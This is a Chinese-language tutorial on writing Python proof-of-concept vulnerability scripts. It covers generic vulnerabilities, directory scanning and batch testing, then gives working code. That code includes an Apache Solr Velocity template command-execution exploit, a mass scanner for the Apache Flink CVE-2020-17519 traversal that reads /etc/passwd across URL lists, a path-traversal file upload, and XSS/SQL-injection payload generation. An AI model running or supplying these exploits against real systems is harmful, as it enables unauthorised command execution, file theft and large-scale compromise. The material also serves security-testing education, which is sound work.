# POC编写相关

   
why how what  
  
为什么要用POC？列举一下渗透测试过程中遇到的漏洞，什么是通用型漏洞，一般怎么测试通用型漏洞。引入burpsuite与test404两种工具  
  
如何使用POC？举例pocsuite以及上述工具中的使用方法  
  
什么是POC？根据名词解释阐述一下，然后再简述一下写脚本需要用到的python库以及方法，以及如何优化POC  


## 一，WHY

以靶场为例，任何靶场都行，主要是POST或者GET类型，要求有输入框  
  
以输入框为漏洞点，我们可以判定，最起码在这个网站上，这个输入点有漏洞（这种漏洞叫事件型）  
  
那么通用型漏洞是什么样子的呢？可以看到网站使用了什么样的CMS，然后尝试搜索一下其他使用同样CMS的网站，去同样的点试试，如果尝试成功了，或者下载了对应的CMS到本地复线成功了，那就可以说，这个漏洞是通用型漏洞  
  
从可视化的界面来看，我们可能只能知道，某网站的顶部的搜索框存在某个漏洞，因为当输入了一些字符串以后，页面会返回一个框，上面显示着 1 ，那么假如在知道了HTTP抓包后，就可以知道，其实是某个文件的某个参数存在漏洞，而页面中的搜索框就算到了网页的任意位置，对那个参数也没有任何影响。这个时候，返回包中的特征值，可能就是alert\(1\)（这就是特征）  
  
一般渗透测试的时候，我们会去扫描目录，去扫描文件  
  
对应可以使用burp的Repeater或者Intruder模块，或者使用御剑这个工具  
  
原理也是根据一个IP地址，然后根据提供的字典，不停替换后面的字符串，再根据返回的响应值判断目标是否有那个目录，文件  
  
200:存在  
30X：存在  
403:常见于一些目录，一般情况下意味着没有权限访问，不过是存在的  
404:确定了不存在了，在访问一些文件时比较常见  
  
200: 极端一些，文件不存在。案例有阿里云等网站，会有自定义的404页面，此时返回值依旧是200  
  
在找到对应的文件，或者功能点的时候，就可以发送任意的模糊数据，去测试一下这个点上是否存在着其他的漏洞类型呢  
  
比如针对 a.php?id=1  
  
 这里可以存在注入，也可能会有XSS漏洞存在。可能这个ID是从提交的文本框中来的  
  
这个时候，也可以用burp去尝试payload，去找到可能存在的漏洞类型  
  
那么，漏洞我找到了，我也知道这个网站使用的CMS了，我这边还找到了一些其他的网站，也是使用的这个CMS，我又应该怎么测试其他网站呢？  
  
方法一：浏览器上，手动更换前面的URL部分，一个个尝试  
方法二：浏览器插件，也是手动，一个个尝试  
方法三：test404工具，将根目录至payload部分剪切出来，再把返回包里面的相关的特征值复制出来，点击保存。之后可以导入大量的网址信息，测试完以后，就可以在短时间内测试出哪些网站可能会存在漏洞  
  
工具差别：如果说burp可以替换根目录以后的各种文件以及参数值来确定一个网站是否有各种各样的情况，那么test404可以根据确定一种情况后的文件去探索各种各样的网站是否存在规定好的那种情况

## 二，HOW

至于怎么使用漏洞验证脚本，根据各种框架的不同，有不同的用法。  
  
例如单个的脚本，可以直接通过 python ![](file:///C:\Users\73604\AppData\Roaming\Tencent\QQTempSys\%W@GJ$ACOF%28TYDYECOKVDYB.png)poc.py ![](file:///C:\Users\73604\AppData\Roaming\Tencent\QQTempSys\%W@GJ$ACOF%28TYDYECOKVDYB.png)http://hao123.com,  python ![](file:///C:\Users\73604\AppData\Roaming\Tencent\QQTempSys\%W@GJ$ACOF%28TYDYECOKVDYB.png)poc.py url.txt  
  
第一个：扫描好123网站是否会存在POC中定义的漏洞内容  
第二个：逐个扫描TXT文档中的URL是否会有POC中的漏洞  
  
  
示例：（参数不一定对）  
如果是使用的漏扫框架，则是： X-ray - u URL - R POC  
通过U参数，输入URL，也可以通过F来输入一个文件内容为很多URL的文件，再通过- R来确定POC

## 三，WHAT

POC，POC \(Proof of Concept\) 验证性测试，译为为观点提供证据，可以理解为证明漏洞存在的代码.  
  
一般来讲，更多人会喜欢使用python语言编写，因为简单。  
  
目前互联网上有的框架，也会使用json，yaml来写，不过会有一些局限性。也有的软件会使用java去编写。  
  
文档以python为例：  
  
1，WEB漏洞  
  
因为要发送HTTP请求，所以需要导入requests库，可以通过引用相关方法去发送请求，如GET，POST，PUT等  
  
  
简单漏洞的burp抓包内容如下：  
  
  
  
体现到代码中，就是：  
 Req = requests.get\(\)  
Req = requests.post\(\)  
  
也可以这样：  
Req = requests.request\(“POST”\)  
  
首先，可以将请求路径部分赋值给 path  
Path = “/confit.php”  
  
之后便是请求行的部分了，在burp中，会发现如果请求的时候没有HOST，那么访问就会失败，不过在python中，不需要刻意定义HOST。为了方便起见，可以先在burp中将请求行简化到最简单，然后放到下面的内容中：  
Headers = {  
“user-agent”: “Firefox/123456”,  
}  
  
  
  
  
  
  
  
  






POC编写的相关内容如下：

{% tabs %}
{% tab title="单次请求" %}
代码如下

```python
#coding:utf-8
#https://twitter.com/jas502n/status/1193869996717297664
import urllib2
import ssl

class Pocscan(object):
	def __init__(self, target):
		self.result = {
			"status":False,
			"target":target,
		}
	def verify(self):
		url = self.result['target'] + '/overview'
		headers = {
			"User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
		}
		# ssl._create_default_https_context = ssl._create_unverified_context
		try:
			req = urllib2.Request(url,headers=headers)
			rsp = urllib2.urlopen(req,timeout=8)
			text = rsp.read()
			if '"taskmanagers"' in text and 'flink-version' in text:
				self.result['status'] = True
				self.result['target'] = url
				self.result['method'] = 'GET'
				self.result['response'] = 'flink-version'
		except Exception as e:
			self.result['info'] = str(e)
		return self.result
```
{% endtab %}

{% tab title="多次请求" %}
代码如下

```python
#coding:utf-8
#https://www.anquanke.com/post/id/190039
import urllib2
import ssl
import re

class Pocscan(object):
	def __init__(self, target):
		self.result = {
			"status":False,
			"target":target,
		}
	def verify(self):
		headers = {
			"User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
		}
		ssl._create_default_https_context = ssl._create_unverified_context
		try:
			url_core = self.result['target'].rstrip('/') + '/solr/admin/cores?indexInfo=false&wt=json'
			req = urllib2.Request(url_core,headers=headers)
			rsp = urllib2.urlopen(req,timeout=8)
			text = rsp.read()
			res = re.search(r'"instanceDir":"(.*?)",',text)
			if res == None:
				return self.result
			else:
				core = res.group(1).split('\\')[-1]
				url_config = self.result['target'].rstrip('/') + '/solr/%s/config'%(core)
				headers1 = {
					"User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
					"Content-Type": "application/json"
				}
				data = '''
				{
  "update-queryresponsewriter": {
    "startup": "lazy",
    "name": "velocity",
    "class": "solr.VelocityResponseWriter",
    "template.base.dir": "",
    "solr.resource.loader.enabled": "true",
    "params.resource.loader.enabled": "true"
  }
}'''
				req = urllib2.Request(url_config,headers=headers1,data=data)
				rsp = urllib2.urlopen(req,timeout=8)
				url = self.result['target'].rstrip('/') + '/solr/{0}/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27netstat%20-an%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end'.format(core)
				req = urllib2.Request(url,headers=headers)
				rsp = urllib2.urlopen(req,timeout=8)
				text = rsp.read()
				if 'LISTEN' in text and 'ESTABLISHED' in text:
					self.result['status'] = True
		except Exception as e:
			self.result['info'] = str(e)
		return self.result
```
{% endtab %}

{% tab title="改批量" %}
相关代码如下：

```python
#!/usr/bin/env python
# coding:utf-8
# author:Yxuan
#affected versions are Apache Flink 1.11.0-1.11.2

import requests,sys,colorama
from colorama import *
init(autoreset=True)


banner='''\033[1;33;40m
  _______      ________    ___   ___ ___   ___        __ ______ _____ __  ___  
 / ____\ \    / /  ____|  |__ \ / _ \__ \ / _ \      /_ |____  | ____/_ |/ _ \ 
| |     \ \  / /| |__ ______ ) | | | | ) | | | |______| |   / /| |__  | | (_) |
| |      \ \/ / |  __|______/ /| | | |/ /| | | |______| |  / / |___ \ | |\__, |
| |____   \  /  | |____    / /_| |_| / /_| |_| |      | | / /   ___) || |  / / 
 \_____|   \/   |______|  |____|\___/____|\___/       |_|/_/   |____/ |_| /_/                                                                                                                                                 
'''


def verify():
	headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36"}
	payload= '/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd' 
	poc=urls+payload
	try:
		requests.packages.urllib3.disable_warnings()#解决InsecureRequestWarning警告
		response=requests.get(poc,headers=headers,timeout=15,verify=False)
		if response.status_code==200 and "root:x" in response.content:
			print(u'\033[1;31;40m[+]{} is apache flink directory traversal vulnerability'.format(urls))
			print(response.content)
			#将漏洞地址输出在Vul.txt中
			f=open('./vul.txt','a')
			f.write(urls)
			f.write('\n')
		else:
			print('\033[1;32;40m[-]{} None'.format(urls))
	except:
		print('{} request timeout'.format(urls))


if __name__ == '__main__':
	print (banner)
	if len(sys.argv)!=2:
		print('Example:python CVE-2020-17519.py urls.txt')
	else:
		file = open(sys.argv[1])
		for url in file.readlines():
			urls=url.strip()
			if urls[-1]=='/':
				urls=urls[:-1]
			verify()
		print ('Check Over')
```
{% endtab %}
{% endtabs %}

对于不同种类的漏洞，最好是有不同的检测方式，例如xray中采用了随机数值的方式检测SQL注入与XSS，那么使用随机数版本的漏扫脚本大概就是这样的：

{% tabs %}
{% tab title="随机数" %}
随机数版本所需代码如下：

```python
# -*- coding: utf-8 -*-
import random
import string
import hashlib

# gongji = ''.join(random.sample(string.ascii_letters + string.digits, 6))

shuzhi = random.randint(0,999999)
yuju = str(shuzhi)
# ------ xss ------

xss = "<script>alert(%s)</script>" % yuju
xss = "<script>alert(" + yuju + ")</script>"

# ------ sqli ------

sqli = hashlib.md5(yuju).hexdigest()
```
{% endtab %}

{% tab title="时间戳" %}
```python
import time

noww = int(time.time())
now = str(noww)
print now

payloads = "/assets/config/config%s.json" % now
```
{% endtab %}
{% endtabs %}

文件上传的方式

{% tabs %}
{% tab title="简洁" %}
```python
# -*- coding: utf-8 -*-

import requests
import random,hashlib
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

target = "https://IP:PORT"
shuzhi = random.randint(0, 999999)
yuju = str(shuzhi)
mdfive = hashlib.md5(yuju).hexdigest()
path = "/jars/upload"
url = target + path
boundry = "----WebKitFormBoundaryoZ8meKnrrso89R6Y"
headers = {
    "Host": target.split("://")[1],
    "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
}

files = {'jarfile': ('../../../../../../tmp/flags', mdfive)}
# proxy = {
#     'http':'http://127.0.0.1:8081',
#     'https':'https://127.0.0.1:8081'
# }

req = requests.post(url, headers=headers, files=files, timeout=10, verify=False)
print req.content
if req.status_code == 400:
    print req.content
    path_1 = "/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252ftmp%252fflags"
    url_1 = target + path_1
    req_1 = requests.get(url_1, headers=headers, timeout=10, verify=False)
    print req_1.text

    if req_1.status_code == 200:
        print  "hahahaha"
        
        
# name:jarfile
# filename:../../../../../../tmp/flags
#文件内容：mdfive
↓        ↓        ↓        ↓        ↓
# POST /jars/upload HTTP/1.1
# Connection: close
# Accept-Encoding: gzip, deflate
# Accept: */*
# User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50
# Host: IP:PORT
# Content-Type: multipart/form-data; boundary=------16403e4608fad6cc1cd8321b8b7d7f22
# Content-Length: 181

# --16403e4608fad6cc1cd8321b8b7d7f22
# Content-Disposition: form-data; name="jarfile"; filename="../../../../../../tmp/flags"
# 
# Hello Requests.
# --16403e4608fad6cc1cd8321b8b7d7f22--
```
{% endtab %}

{% tab title="分段" %}
当文件上传遇到分段传输：

![&#x793A;&#x4F8B;&#x4EE3;&#x7801;](../../.gitbook/assets/image%20%281074%29.png)

相关代码示例如下：

```python
file = {
    'name': ('filename', u'文件内容', u'文件自定义Content-Type'),
    'file[]': ('shell.php', data, 'application/octet-stream'),
    'name2': (None, 'huan'),
    None: ('haha', 'ni'),
    None: ('xixi', 'ya'),
}
```
{% endtab %}
{% endtabs %}



